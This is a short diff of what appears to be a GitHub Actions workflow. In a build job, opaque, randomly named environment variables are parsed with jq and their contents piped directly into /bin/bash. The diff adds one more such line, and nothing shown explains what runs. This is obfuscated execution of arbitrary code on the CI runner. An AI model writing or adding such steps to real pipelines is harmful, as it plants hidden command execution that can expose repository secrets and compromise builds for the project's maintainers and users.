@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$g15239" | jq -r .h094 | /bin/bash
           printf '%s' "$nie3" | jq -r .nmg7 | /bin/bash
           echo $amryu84 | jq -r .rn56942 | /bin/bash
+          printf '%s' "$p8434" | jq -r .u5658 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
